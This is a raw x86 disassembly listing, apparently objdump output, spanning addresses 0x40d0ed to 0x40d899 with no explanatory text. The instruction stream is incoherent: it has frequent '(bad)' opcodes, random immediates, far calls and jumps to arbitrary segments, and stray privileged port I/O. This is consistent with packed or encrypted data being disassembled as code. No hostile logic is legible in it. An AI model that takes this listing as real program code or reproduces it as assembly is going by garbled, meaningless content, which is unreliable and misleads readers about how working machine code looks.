  40d0ed:	mov    al,ds:0x447c9460
  40d0f2:	repnz std 
  40d0f4:	adc    DWORD PTR [edi+0x4c],edx
  40d0f7:	or     bh,ch
  40d0f9:	inc    ebp
  40d0fa:	nop
  40d0fb:	addr16 push cs
  40d0fd:	test   DWORD PTR [edi-0x34],ebx
  40d100:	ins    DWORD PTR es:[edi],dx
  40d101:	in     al,dx
  40d102:	add    DWORD PTR [eax],esp
  40d104:	add    bh,BYTE PTR [ebx+0x14022a49]
  40d10a:	aaa    
  40d10b:	xchg   ebp,eax
  40d10c:	pusha  
  40d10d:	and    BYTE PTR [esi],dl
  40d10f:	push   ds
  40d110:	push   eax
  40d111:	mov    ecx,0x3af7844a
  40d116:	push   edi
  40d117:	popf   
  40d118:	lods   eax,DWORD PTR ds:[esi]
  40d119:	call   0x568b:0x7f919bc6
  40d120:	retf   0x30ba
  40d123:	mov    edx,0x848a7347
  40d128:	push   cs
  40d129:	ins    BYTE PTR es:[edi],dx
  40d12a:	push   ecx
  40d12b:	out    dx,eax
  40d12c:	sbb    edi,eax
  40d12e:	lds    ecx,FWORD PTR [eax-0x58]
  40d131:	inc    esp
  40d132:	mov    al,0x37
  40d134:	sbb    BYTE PTR [esi-0x12],al
  40d137:	aam    0x98
  40d139:	clc    
  40d13a:	cmp    esp,DWORD PTR [esi+edi*1-0x14499995]
  40d141:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d142:	dec    esi
  40d143:	and    BYTE PTR [ebx-0x18],cl
  40d146:	mov    ecx,0xc76a20a3
  40d14b:	mov    eax,0xc278be51
  40d150:	pop    ds
  40d151:	mov    esp,0x5f2150d6
  40d156:	test   al,dl
  40d158:	or     DWORD PTR [eax-0x32],ecx
  40d15b:	xlat   BYTE PTR ds:[ebx]
  40d15c:	adc    al,cl
  40d15e:	cdq    
  40d15f:	adc    BYTE PTR [edi-0x30c363f],dl
  40d165:	pusha  
  40d166:	lea    edi,[esp+eiz*4+0x7]
  40d16a:	inc    ecx
  40d16b:	scas   al,BYTE PTR es:[edi]
  40d16c:	jmp    0x40d0f5
  40d16e:	xchg   edx,eax
  40d16f:	scas   eax,DWORD PTR es:[edi]
  40d170:	mov    ecx,0x9bb00cf4
  40d175:	sti    
  40d176:	sbb    al,0x48
  40d178:	frstor [ebx+0x4b]
  40d17b:	mov    al,ds:0x392796e5
  40d180:	stc    
  40d181:	and    esi,DWORD PTR [edx-0x45]
  40d184:	sbb    eax,0xddf108c7
  40d189:	stc    
  40d18a:	mov    edi,0x48f1c2d4
  40d18f:	pop    esi
  40d190:	int3   
  40d191:	inc    ebx
  40d192:	add    ecx,DWORD PTR [eax-0x8d4b78b]
  40d198:	scas   eax,DWORD PTR es:[edi]
  40d199:	mov    ebx,0xab97ab18
  40d19e:	xor    DWORD PTR [edi-0x31],ebp
  40d1a1:	outs   dx,BYTE PTR ds:[esi]
  40d1a2:	out    dx,eax
  40d1a3:	inc    esp
  40d1a4:	xor    eax,DWORD PTR [ecx]
  40d1a6:	imul   esp,DWORD PTR [esi],0xfad431f2
  40d1ac:	mov    edx,0x82d9d279
  40d1b1:	jno    0x40d18f
  40d1b3:	or     BYTE PTR [esi-0x599fb312],dl
  40d1b9:	mov    ecx,0x20bb3dcd
  40d1be:	sub    BYTE PTR [ebp*8+0x19ff99bf],ch
  40d1c5:	arpl   WORD PTR [edi-0x62],cx
  40d1c8:	mov    ds:0x5a7bbf8e,al
  40d1cd:	fldcw  WORD PTR [edx]
  40d1cf:	int    0x2c
  40d1d1:	retf   
  40d1d2:	push   eax
  40d1d3:	inc    ecx
  40d1d4:	data16 lahf 
  40d1d6:	push   ds
  40d1d7:	inc    ecx
  40d1d8:	aam    0xb6
  40d1da:	inc    ebp
  40d1db:	nop
  40d1dc:	stos   DWORD PTR es:[edi],eax
  40d1dd:	jmp    0x9ae1:0xe4162f38
  40d1e4:	mov    ebx,DWORD PTR [ecx-0x69]
  40d1e7:	mov    al,0x31
  40d1e9:	mov    ah,0xc
  40d1eb:	fild   WORD PTR [eax]
  40d1ed:	push   es
  40d1ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d1ef:	cmp    DWORD PTR [eax],esi
  40d1f1:	pop    ecx
  40d1f2:	pusha  
  40d1f3:	jbe    0x40d1bc
  40d1f5:	js     0x40d20c
  40d1f7:	jnp    0x40d198
  40d1f9:	(bad)
  40d1fc:	inc    ebp
  40d1fd:	xlat   BYTE PTR ds:[ebx]
  40d1fe:	xchg   esp,eax
  40d1ff:	mov    ecx,0xcce65bc5
  40d204:	cmp    BYTE PTR [edi-0x178ce9a8],dh
  40d20a:	icebp  
  40d20b:	sub    esi,0x324af7de
  40d211:	cmp    DWORD PTR [ebp-0x4b],0x26fa8d10
  40d218:	fnstenv [edi+0x6bc042df]
  40d21e:	ins    BYTE PTR es:[edi],dx
  40d21f:	and    ah,BYTE PTR [esi+ebp*4+0x72de95a7]
  40d226:	adc    eax,0xe5ca1a44
  40d22b:	xchg   edi,eax
  40d22c:	fsubr  DWORD PTR [ecx-0x26f92938]
  40d232:	cs aad 0x3c
  40d235:	add    esi,DWORD PTR [esi-0x7e8e7d76]
  40d23b:	stos   BYTE PTR es:[edi],al
  40d23c:	mov    ecx,0x44ca6057
  40d241:	rcl    ch,1
  40d243:	iret   
  40d244:	iret   
  40d245:	jo     0x40d1ff
  40d247:	in     al,dx
  40d248:	adc    ah,BYTE PTR [ecx-0x8]
  40d24b:	sub    DWORD PTR [ecx],ebx
  40d24d:	dec    ebp
  40d24e:	sahf   
  40d24f:	mov    ch,0xf5
  40d251:	cmp    DWORD PTR [eax],ebp
  40d253:	mov    DWORD PTR [ecx-0x1f4b32e3],esp
  40d259:	shr    bh,1
  40d25b:	(bad)  
  40d25c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d25d:	mov    DWORD PTR [eax+0x490a111d],esi
  40d263:	mov    ds:0x6ff6de66,eax
  40d268:	(bad)  
  40d269:	sub    eax,0xc302d566
  40d26e:	mov    DWORD PTR [ecx-0x80],ecx
  40d271:	xchg   DWORD PTR [ebx+0x3],eax
  40d274:	je     0x40d207
  40d276:	dec    ebx
  40d277:	jmp    0x2748:0xcb55f2ec
  40d27e:	jecxz  0x40d2a1
  40d280:	adc    DWORD PTR [ecx+0x6bff099c],ecx
  40d286:	and    DWORD PTR [edx+eax*8],ecx
  40d289:	shr    DWORD PTR [edx],cl
  40d28b:	cmp    al,0x2c
  40d28d:	retf   0x1764
  40d290:	into   
  40d291:	shr    bh,cl
  40d293:	mov    edi,0x6507d5eb
  40d298:	mov    bh,0x9c
  40d29a:	dec    ebp
  40d29b:	inc    edi
  40d29c:	push   ebx
  40d29d:	leave  
  40d29e:	pop    esi
  40d29f:	jg     0x40d31a
  40d2a1:	sbb    DWORD PTR [edx+0x11d465fd],edi
  40d2a7:	dec    ebp
  40d2a8:	adc    eax,0xa79f4720
  40d2ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d2ae:	sub    BYTE PTR [esi+0x5b0a01b0],ah
  40d2b4:	mov    edi,ebx
  40d2b6:	mov    edx,0xf5e90888
  40d2bb:	test   DWORD PTR [ebp+0x21],esp
  40d2be:	xchg   esi,eax
  40d2bf:	and    al,0xc8
  40d2c1:	cli    
  40d2c2:	test   ch,dl
  40d2c4:	call   DWORD PTR [ecx+0x36b59ae]
  40d2ca:	scas   al,BYTE PTR es:[edi]
  40d2cb:	stc    
  40d2cc:	(bad)  
  40d2ce:	call   0x4d1e:0xc50d2f2b
  40d2d5:	mov    cl,0xed
  40d2d7:	sbb    BYTE PTR [edx],al
  40d2d9:	aad    0xfe
  40d2db:	sbb    ebx,DWORD PTR [ebp-0x20229931]
  40d2e1:	cmp    BYTE PTR [ebx-0x6],bh
  40d2e4:	and    BYTE PTR [ebx+0x6a1e99d8],ch
  40d2ea:	cdq    
  40d2eb:	hlt    
  40d2ec:	jecxz  0x40d282
  40d2ee:	aaa    
  40d2ef:	or     eax,0x77173d76
  40d2f4:	or     bl,BYTE PTR [edx]
  40d2f6:	mov    esp,0x64da864b
  40d2fb:	mov    ecx,0xbd3ef829
  40d300:	nop
  40d301:	sti    
  40d302:	loop   0x40d2b5
  40d304:	aad    0x23
  40d306:	mov    al,ds:0xc9c11e77
  40d30b:	cmp    eax,0x64247c48
  40d310:	jbe    0x40d35a
  40d312:	scas   al,BYTE PTR es:[edi]
  40d313:	imul   edx,DWORD PTR [esi],0x28
  40d316:	rcr    ecx,1
  40d318:	or     edi,DWORD PTR [esp+eax*1+0x4d5f0ed7]
  40d31f:	imul   ebx,edi,0xc977ffa0
  40d325:	xchg   edx,eax
  40d326:	mov    WORD PTR [esi-0x31a748e4],ds
  40d32c:	jb     0x40d363
  40d32e:	push   ecx
  40d32f:	arpl   WORD PTR [ebx-0x7ab0ad40],dx
  40d335:	test   eax,0xd13b02d1
  40d33a:	retf   
  40d33b:	popa   
  40d33c:	dec    edi
  40d33d:	mov    ah,0x20
  40d33f:	in     eax,dx
  40d340:	retf   0x4e1c
  40d343:	leave  
  40d344:	adc    eax,0x2b844e04
  40d349:	lahf   
  40d34a:	xchg   edx,eax
  40d34b:	cwde   
  40d34c:	pop    edi
  40d34d:	into   
  40d34e:	rol    DWORD PTR [ecx-0x60],0x8
  40d352:	add    al,0x23
  40d354:	push   ecx
  40d355:	mov    ah,0xc9
  40d357:	jle    0x40d3b1
  40d359:	cmp    al,0x9a
  40d35b:	(bad)  
  40d35c:	ficom  WORD PTR [bx+di]
  40d35f:	mov    dl,0xd
  40d361:	and    eax,DWORD PTR [edx]
  40d363:	jnp    0x40d35b
  40d365:	sbb    ah,0x45
  40d368:	xchg   esi,eax
  40d369:	aas    
  40d36a:	adc    al,BYTE PTR [ebp+0x2e28ba99]
  40d370:	pop    ebx
  40d371:	int    0x7
  40d373:	mov    cl,0x1c
  40d375:	cwde   
  40d376:	ret    
  40d377:	call   0xea7c80a2
  40d37c:	clc    
  40d37d:	xchg   edi,eax
  40d37e:	mov    cl,0xc4
  40d380:	add    BYTE PTR [edi+0x7f],al
  40d383:	xor    edx,esp
  40d385:	mov    ah,0x1
  40d387:	xor    al,0xb
  40d389:	retf   0xb7d5
  40d38c:	add    edx,0x56
  40d38f:	xchg   edx,eax
  40d390:	adc    eax,0xbeb251cf
  40d395:	test   DWORD PTR [edx+0x48],edx
  40d398:	xchg   ecx,eax
  40d399:	pop    ss
  40d39a:	into   
  40d39b:	dec    esi
  40d39c:	pop    esi
  40d39d:	adc    DWORD PTR [eax+0x19323fb8],ebp
  40d3a3:	jmp    0x40d33b
  40d3a5:	ror    BYTE PTR [ebx-0x5b71f177],1
  40d3ab:	and    ch,cl
  40d3ad:	popf   
  40d3ae:	out    0xcf,al
  40d3b0:	add    DWORD PTR [ebx+eiz*1+0x7e],eax
  40d3b4:	pusha  
  40d3b5:	fnstcw WORD PTR ds:0x3ea17696
  40d3bb:	mov    bl,BYTE PTR [ebx-0x50]
  40d3be:	or     esi,DWORD PTR ds:0x635bd891
  40d3c4:	push   0xffffff80
  40d3c6:	sub    DWORD PTR [ecx-0x77],edx
  40d3c9:	jns    0x40d3b3
  40d3cb:	xchg   ebx,eax
  40d3cc:	or     BYTE PTR [ecx+0x2b009918],0x76
  40d3d3:	push   0x246f5f1d
  40d3d8:	test   al,0x1d
  40d3da:	sbb    BYTE PTR [eax+0x5fd641f3],ch
  40d3e0:	ja     0x40d3ba
  40d3e2:	xchg   esi,eax
  40d3e3:	inc    esp
  40d3e4:	lods   eax,DWORD PTR ds:[esi]
  40d3e5:	jns    0x40d41f
  40d3e7:	sub    DWORD PTR [edi-0x574ab7b4],esp
  40d3ed:	mov    bl,0x88
  40d3ef:	ficomp DWORD PTR [esp+ebx*4-0x40ebdf39]
  40d3f6:	nop
  40d3f7:	inc    eax
  40d3f8:	retf   
  40d3f9:	retf   0x7d27
  40d3fc:	hlt    
  40d3fd:	fs mov ebx,0x2578110f
  40d403:	repnz add al,0xe5
  40d406:	ret    0xaa54
  40d409:	sub    esp,ebx
  40d40b:	addr16 pop edx
  40d40d:	outs   dx,BYTE PTR ds:[esi]
  40d40e:	mov    dl,0xfe
  40d410:	dec    ecx
  40d411:	cmp    al,0x2
  40d413:	int3   
  40d414:	mov    eax,0x946a9e98
  40d419:	cli    
  40d41a:	repnz push ss
  40d41c:	pop    edx
  40d41d:	lahf   
  40d41e:	vmwrite ebx,DWORD PTR [ecx+0x4031342f]
  40d425:	test   ebx,esp
  40d427:	mov    eax,0x288e92f
  40d42c:	add    cl,0x59
  40d42f:	cld    
  40d430:	lods   eax,DWORD PTR ds:[esi]
  40d431:	cmp    dh,BYTE PTR [ebx+ebx*8-0x4d]
  40d435:	push   ss
  40d436:	outs   dx,DWORD PTR ds:[esi]
  40d437:	jnp    0x40d444
  40d439:	call   0x9add:0x131188e1
  40d440:	and    eax,0x3a6e620c
  40d445:	in     eax,0x32
  40d447:	sub    eax,0xf0b2a0c2
  40d44c:	mul    DWORD PTR [eax-0x6d]
  40d44f:	test   DWORD PTR [esi+0x4d41aac6],eax
  40d455:	es mov esp,0xde6adb16
  40d45b:	pop    edx
  40d45c:	push   0x59
  40d45e:	sub    eax,0x6466758e
  40d463:	pusha  
  40d464:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d465:	jne    0x40d410
  40d467:	and    al,0x18
  40d469:	or     esi,ebx
  40d46b:	adc    BYTE PTR [ebx+0x6a80faec],bh
  40d471:	call   0x5fa6:0x36029d6e
  40d478:	inc    ecx
  40d479:	outs   dx,BYTE PTR ds:[esi]
  40d47a:	fcom   QWORD PTR [esi+0xa411686]
  40d480:	dec    eax
  40d481:	inc    edx
  40d482:	adc    al,0x72
  40d484:	arpl   bx,ax
  40d486:	inc    ebx
  40d487:	and    cl,BYTE PTR [eax+0x35]
  40d48a:	stos   DWORD PTR es:[edi],eax
  40d48b:	stc    
  40d48c:	cmp    eax,0x27239565
  40d491:	xchg   ebx,eax
  40d492:	call   0x5615c439
  40d497:	xchg   ecx,eax
  40d498:	inc    DWORD PTR [esi-0x57780c52]
  40d49e:	pushf  
  40d49f:	leave  
  40d4a0:	outs   dx,DWORD PTR ds:[esi]
  40d4a1:	inc    esi
  40d4a2:	cmp    edx,esi
  40d4a4:	inc    ebp
  40d4a5:	push   ds
  40d4a6:	es (bad) 
  40d4a8:	dec    edx
  40d4a9:	xchg   esi,eax
  40d4aa:	cs test dh,0xbb
  40d4ae:	xor    BYTE PTR [eax-0xee1bc13],dl
  40d4b4:	cmp    BYTE PTR [ebp+0x5efb431],dl
  40d4ba:	cmp    esp,DWORD PTR [ebx-0x80]
  40d4bd:	jecxz  0x40d4d1
  40d4bf:	stos   BYTE PTR es:[edi],al
  40d4c0:	xor    al,0xe0
  40d4c2:	test   eax,0x48232055
  40d4c7:	popa   
  40d4c8:	fistp  WORD PTR [esp+ebx*1]
  40d4cb:	out    dx,al
  40d4cc:	sbb    ebp,DWORD PTR [ebx+edi*8]
  40d4cf:	popa   
  40d4d0:	cmp    bl,BYTE PTR [ebx]
  40d4d2:	and    BYTE PTR [ecx],al
  40d4d4:	and    cl,BYTE PTR [edx-0x5165c374]
  40d4da:	fld    DWORD PTR [edi+0x501197ce]
  40d4e0:	stc    
  40d4e1:	adc    ebp,DWORD PTR [ebx-0x229bb6c]
  40d4e7:	dec    ebp
  40d4e8:	xor    BYTE PTR [ebp+0x76],dh
  40d4eb:	cmp    DWORD PTR [eax-0x29],esp
  40d4ee:	jmp    0x40d4f4
  40d4f0:	iret   
  40d4f1:	pop    ebp
  40d4f2:	call   0x2301:0x4eb5255b
  40d4f9:	mov    dh,0xeb
  40d4fb:	dec    BYTE PTR [edi]
  40d4fd:	clc    
  40d4fe:	out    dx,eax
  40d4ff:	xor    DWORD PTR [edi-0x583b1eee],edi
  40d505:	loope  0x40d513
  40d507:	pop    eax
  40d508:	xor    BYTE PTR [edi-0x4f],bh
  40d50b:	inc    esp
  40d50c:	js     0x40d4bb
  40d50e:	dec    ebx
  40d50f:	es clc 
  40d511:	push   edx
  40d512:	push   eax
  40d513:	xchg   ebp,eax
  40d514:	stos   DWORD PTR es:[edi],eax
  40d515:	xor    BYTE PTR [ecx+0x764e6837],bh
  40d51b:	sbb    ah,BYTE PTR [esi+0x39]
  40d51e:	test   eax,0x919da380
  40d523:	loope  0x40d540
  40d525:	cli    
  40d526:	scas   al,BYTE PTR es:[edi]
  40d527:	das    
  40d528:	imul   esp,DWORD PTR [ecx],0x10b07315
  40d52e:	adc    ah,al
  40d530:	or     cl,BYTE PTR [ebx+edx*1]
  40d533:	xor    ebx,DWORD PTR [eax-0x1a6b06be]
  40d539:	and    eax,DWORD PTR [esi]
  40d53b:	gs int 0x77
  40d53e:	retf   0x3cce
  40d541:	jge    0x40d548
  40d543:	imul   BYTE PTR [ebx+0x6d00906f]
  40d549:	lock and al,0x4c
  40d54c:	dec    ecx
  40d54d:	push   ecx
  40d54e:	ins    BYTE PTR es:[edi],dx
  40d54f:	cmp    al,BYTE PTR [edx]
  40d551:	mov    ds:0x82371b97,al
  40d556:	mov    al,ds:0x3b0b1e11
  40d55b:	mov    bl,0x8c
  40d55d:	or     ebx,DWORD PTR [ebp+0x5a]
  40d560:	mov    ecx,0x6e88aa87
  40d565:	jns    0x40d540
  40d567:	pop    esi
  40d568:	inc    esp
  40d569:	inc    esp
  40d56a:	ins    BYTE PTR es:[edi],dx
  40d56b:	and    eax,0x676e4578
  40d570:	pop    ds
  40d571:	mov    ah,0x2
  40d573:	jmp    0xb385:0x45a9eb84
  40d57a:	dec    ebp
  40d57b:	mov    eax,0xf672540d
  40d580:	add    ebp,DWORD PTR [ebx-0x6]
  40d583:	pop    edi
  40d584:	mov    eax,ds:0x63523ecc
  40d589:	push   esi
  40d58a:	pop    eax
  40d58b:	cld    
  40d58c:	ja     0x40d574
  40d58e:	fiadd  WORD PTR [edi]
  40d590:	fcomp  DWORD PTR [eax-0x73]
  40d593:	fsub   DWORD PTR [edx-0x36]
  40d596:	fwait
  40d597:	loopne 0x40d51a
  40d599:	xor    BYTE PTR [ebp-0x2],0x25
  40d59d:	xchg   edx,eax
  40d59e:	call   0x26fd:0x6b2a9739
  40d5a5:	dec    esp
  40d5a6:	popf   
  40d5a7:	mov    BYTE PTR [edi+0x75],cl
  40d5aa:	sti    
  40d5ab:	comiss xmm3,xmm0
  40d5ae:	xchg   edx,eax
  40d5af:	push   esi
  40d5b0:	sub    eax,0x466bc492
  40d5b5:	pop    esp
  40d5b6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d5b7:	in     al,0x2f
  40d5b9:	dec    esi
  40d5ba:	pushf  
  40d5bb:	mov    esi,0x79da456
  40d5c0:	ret    
  40d5c1:	and    eax,0x6859b216
  40d5c6:	fistp  WORD PTR ds:0x8ed2b1d5
  40d5cc:	mov    ds:0x185112d2,eax
  40d5d1:	and    al,0x4b
  40d5d3:	int    0x5
  40d5d5:	and    eax,0x1d3031fa
  40d5da:	fstp   TBYTE PTR [ecx*4-0x702b284c]
  40d5e1:	add    BYTE PTR [ecx-0x2711ea9],cl
  40d5e7:	mov    cl,0xc3
  40d5e9:	xchg   ebp,eax
  40d5eb:	jl     0x40d61d
  40d5ed:	retf   
  40d5ee:	push   ecx
  40d5ef:	xor    eax,0x5cdeaeaa
  40d5f4:	sub    eax,0x415aa959
  40d5f9:	nop
  40d5fa:	out    0xc0,eax
  40d5fc:	add    BYTE PTR [ebp+0x66cb6537],0xbb
  40d603:	mov    edx,0x56e11dc9
  40d608:	sbb    esi,DWORD PTR [edx+0x18]
  40d60b:	retf   0x7789
  40d60e:	inc    ebx
  40d60f:	add    edx,DWORD PTR [edi]
  40d611:	addr16 sub eax,0x8681a7c2
  40d617:	mov    dl,0xc1
  40d619:	call   0xd1f1438d
  40d61e:	out    dx,eax
  40d61f:	test   al,0x36
  40d621:	mov    al,0x5b
  40d623:	sbb    eax,0xf534d755
  40d628:	xor    BYTE PTR [ebx],0x6c
  40d62b:	out    dx,al
  40d62c:	ja     0x40d623
  40d62e:	or     esp,0xffffff8f
  40d631:	push   ebx
  40d632:	mov    edx,cs
  40d634:	pushf  
  40d635:	lahf   
  40d636:	clc    
  40d637:	lods   al,BYTE PTR ds:[esi]
  40d638:	jnp    0x40d5cb
  40d63a:	les    edx,FWORD PTR [eax-0x5a]
  40d63d:	push   esi
  40d63e:	adc    esi,DWORD PTR fs:[edx-0x73f77e29]
  40d645:	pop    edi
  40d646:	je     0x40d673
  40d648:	push   0x73
  40d64a:	jecxz  0x40d68d
  40d64c:	lods   eax,DWORD PTR ds:[esi]
  40d64d:	xor    esi,DWORD PTR [ecx+0x54f122ee]
  40d653:	cmc    
  40d654:	(bad)  
  40d655:	and    al,0x9f
  40d657:	and    DWORD PTR [esp+edi*1+0x0],ecx
  40d65b:	pop    esp
  40d65c:	or     BYTE PTR [esi-0x2d],bh
  40d65f:	inc    esp
  40d660:	ins    DWORD PTR es:[edi],dx
  40d661:	nop
  40d662:	pusha  
  40d663:	inc    ebp
  40d664:	inc    ebp
  40d665:	mov    BYTE PTR [ecx+eiz*4-0x31],bl
  40d669:	add    edx,DWORD PTR [edx+edx*4-0x3300408a]
  40d670:	shl    BYTE PTR [eax],0xb4
  40d673:	xchg   edx,eax
  40d674:	hlt    
  40d675:	out    dx,al
  40d676:	jp     0x40d656
  40d678:	or     al,0x24
  40d67a:	(bad)  
  40d67b:	jmp    0x40d63c
  40d67d:	stc    
  40d67e:	fild   QWORD PTR ds:0x8b03e649
  40d684:	jl     0x40d6c7
  40d686:	sub    al,0xf
  40d688:	pop    edi
  40d689:	sub    BYTE PTR [ecx+0x1a53ac60],al
  40d68f:	push   cs
  40d690:	in     eax,dx
  40d691:	mov    bh,0xc4
  40d693:	outs   dx,BYTE PTR ds:[esi]
  40d694:	enter  0xf02e,0x53
  40d698:	xlat   BYTE PTR ds:[ebx]
  40d699:	push   edi
  40d69a:	inc    edx
  40d69b:	bound  ebx,QWORD PTR [ecx+0x16349071]
  40d6a1:	push   eax
  40d6a2:	in     al,0xc6
  40d6a4:	pop    ds
  40d6a5:	shr    DWORD PTR [edi+0x42c4af81],1
  40d6ab:	icebp  
  40d6ac:	arpl   dx,bp
  40d6ae:	dec    edi
  40d6af:	xor    ecx,edi
  40d6b1:	jns    0x40d6aa
  40d6b3:	adc    esp,esi
  40d6b5:	bound  ebp,QWORD PTR [ebx*8+0x4dc94c47]
  40d6bc:	mov    dh,0xb6
  40d6be:	or     esi,DWORD PTR es:0x29582d07
  40d6c5:	fst    DWORD PTR [edx-0x65]
  40d6c8:	or     ecx,DWORD PTR [eax+0x63]
  40d6cb:	push   ss
  40d6cc:	les    esi,FWORD PTR [ecx]
  40d6ce:	mov    esi,0x18c87313
  40d6d3:	dec    DWORD PTR [eax]
  40d6d5:	ins    DWORD PTR es:[edi],dx
  40d6d6:	and    al,0xf9
  40d6d8:	push   cs
  40d6d9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40d6da:	call   0xe5ec:0x1c07
  40d6e0:	jb     0x40d69f
  40d6e2:	and    eax,0xd7f8d45c
  40d6e7:	stos   DWORD PTR es:[edi],eax
  40d6e8:	jmp    0x63c9:0xb61896a2
  40d6ef:	fwait
  40d6f0:	sub    ecx,DWORD PTR [ebp+0xbdb4d34]
  40d6f6:	jl     0x40d702
  40d6f8:	jae    0x40d6fa
  40d6fa:	shl    DWORD PTR [esi-0x76],cl
  40d6fd:	jmp    0xd9acccc4
  40d702:	jns    0x40d753
  40d704:	mov    bl,0xfe
  40d706:	cmp    dh,BYTE PTR [edi+eax*2]
  40d709:	xor    dh,bl
  40d70b:	add    bp,WORD PTR ss:[ecx-0x31]
  40d710:	and    al,0xe9
  40d712:	inc    ebx
  40d713:	daa    
  40d714:	pop    ds
  40d715:	mov    BYTE PTR [edx-0x68],bh
  40d718:	test   eax,0x72258a0
  40d71d:	add    al,0x6d
  40d71f:	retf   0x6101
  40d722:	idiv   DWORD PTR [ebp+0x73]
  40d725:	mov    ds:0x54d39785,al
  40d72a:	mov    DWORD PTR [edi],ecx
  40d72c:	arpl   di,ax
  40d72e:	outs   dx,BYTE PTR ds:[esi]
  40d72f:	xor    dl,ah
  40d731:	lahf   
  40d732:	test   al,0xe9
  40d734:	dec    esp
  40d735:	push   0xfdbe1945
  40d73a:	adc    eax,0xf45ae23f
  40d73f:	imul   ebx,ebp,0xe7e3d345
  40d745:	and    al,0xd2
  40d747:	lea    ebx,[edi+0x603e197f]
  40d74d:	xchg   esp,eax
  40d74e:	add    al,0x4
  40d750:	push   es
  40d751:	add    esp,esi
  40d753:	jno    0x40d7c6
  40d755:	jmp    0x40d799
  40d757:	or     ch,bl
  40d759:	je     0x40d726
  40d75b:	stos   DWORD PTR es:[edi],eax
  40d75c:	lea    edi,[ebp-0x48]
  40d75f:	out    dx,al
  40d760:	cmp    ecx,edx
  40d762:	fs sti 
  40d764:	dec    esp
  40d765:	or     dh,BYTE PTR [eax+0x3bd07027]
  40d76b:	pop    esi
  40d76c:	inc    esp
  40d76d:	(bad)  
  40d76e:	pusha  
  40d76f:	rol    BYTE PTR [eax],cl
  40d771:	push   edi
  40d772:	and    esp,DWORD PTR [esi]
  40d774:	jg     0x40d74b
  40d776:	push   0x33
  40d778:	adc    bl,BYTE PTR [esi+0x42a18095]
  40d77e:	daa    
  40d77f:	lahf   
  40d780:	rol    al,cl
  40d782:	(bad)  
  40d783:	lea    edx,[esi+0x1e]
  40d786:	push   ss
  40d787:	add    al,0xa4
  40d789:	push   0xf0a2c567
  40d78e:	shl    DWORD PTR [edi-0x38b596cd],0xa1
  40d795:	inc    DWORD PTR [edi+edi*2]
  40d798:	xchg   BYTE PTR ds:0x825daf15,ah
  40d79e:	in     al,0xec
  40d7a0:	out    dx,eax
  40d7a1:	sbb    bh,BYTE PTR [edx-0x37]
  40d7a4:	enter  0x1065,0xf0
  40d7a8:	lahf   
  40d7a9:	jb     0x40d813
  40d7ab:	pop    eax
  40d7ac:	test   dh,dl
  40d7ae:	ret    0xf5be
  40d7b1:	inc    ebp
  40d7b2:	(bad)  
  40d7b3:	out    dx,eax
  40d7b4:	repnz xchg ebp,edx
  40d7b7:	imul   ebx,DWORD PTR [esi+0x5f5ce09],0x1565dd29
  40d7c1:	push   ss
  40d7c2:	icebp  
  40d7c3:	add    DWORD PTR [eax-0x3],ebp
  40d7c6:	bound  edx,QWORD PTR [ecx-0x75]
  40d7c9:	mov    DWORD PTR [ebx],esp
  40d7cb:	sti    
  40d7cc:	popa   
  40d7cd:	ret    
  40d7ce:	mov    al,ds:0x63a4545a
  40d7d3:	push   ds
  40d7d4:	aaa    
  40d7d5:	xlat   BYTE PTR ds:[ebx]
  40d7d6:	sbb    eax,0x2f91dd
  40d7db:	add    DWORD PTR [edx-0xc],0x8efb5937
  40d7e2:	pop    edx
  40d7e3:	jmp    0x40d815
  40d7e5:	adc    edx,DWORD PTR [edi+eiz*4+0x415339be]
  40d7ec:	in     al,0x5b
  40d7ee:	sar    ecx,cl
  40d7f0:	push   0xfffffff3
  40d7f2:	add    DWORD PTR [edi],0xffffffef
  40d7f5:	or     eax,0x3ab4994e
  40d7fa:	call   0xb064:0x1d8e5ad3
  40d801:	mov    ebp,0x25c262b
  40d806:	xchg   edx,eax
  40d807:	ror    esi,1
  40d809:	jecxz  0x40d7b6
  40d80b:	xchg   esi,eax
  40d80c:	pop    ds
  40d80d:	in     eax,0x52
  40d80f:	retf   
  40d810:	pop    ds
  40d811:	xchg   esp,eax
  40d812:	adc    cl,BYTE PTR [eax]
  40d814:	(bad)  
  40d815:	pop    edx
  40d816:	sbb    ecx,ecx
  40d818:	and    DWORD PTR [ebx+0x1e],0x82ae5468
  40d81f:	ret    0x88ba
  40d822:	push   es
  40d823:	daa    
  40d824:	adc    DWORD PTR [edi],eax
  40d826:	cmp    BYTE PTR [esi],ah
  40d828:	and    al,0xea
  40d82b:	aaa    
  40d82c:	cmp    ebx,esi
  40d82e:	(bad)  
  40d831:	dec    esp
  40d832:	arpl   WORD PTR [ebp+0x7abec54],di
  40d838:	imul   esp,DWORD PTR [edx-0xa],0x76
  40d83c:	and    edi,DWORD PTR [esi]
  40d83e:	icebp  
  40d83f:	in     eax,0x54
  40d841:	lahf   
  40d842:	jmp    0x6f2fa6d7
  40d847:	ret    0x5ec4
  40d84a:	jle    0x40d847
  40d84c:	push   ecx
  40d84d:	adc    eax,0xd880d286
  40d852:	push   ss
  40d853:	add    DWORD PTR [esi-0x7f0879fb],esi
  40d859:	dec    edi
  40d85a:	adc    edx,DWORD PTR [ebx-0x12]
  40d85d:	cmp    al,0x66
  40d85f:	fld    TBYTE PTR [eax]
  40d861:	fsubrp st(1),st
  40d863:	arpl   dx,si
  40d865:	retf   0x7f0b
  40d868:	sbb    BYTE PTR [ebx],bl
  40d86a:	pop    esi
  40d86b:	jae    0x40d8be
  40d86d:	xor    al,0x4b
  40d86f:	js     0x40d861
  40d871:	nop
  40d872:	mov    ds:0x20a35ef3,al
  40d877:	ror    DWORD PTR [eax-0x70],0xe4
  40d87b:	(bad)  
  40d87c:	outs   dx,BYTE PTR ds:[esi]
  40d87d:	sbb    BYTE PTR [edi-0x2f],bh
  40d880:	push   ecx
  40d881:	aam    0xbc
  40d883:	push   0x27
  40d885:	pop    es
  40d886:	adc    DWORD PTR [esi],esi
  40d888:	pop    ebp
  40d889:	out    0xe4,al
  40d88b:	add    eax,0xfc13cf77
  40d890:	repnz fmul DWORD PTR [ecx]
  40d893:	out    dx,al
  40d894:	mov    edi,0xf53cb880
  40d899:	add    DWORD PTR [ebp+0x2a],0xb717fe57
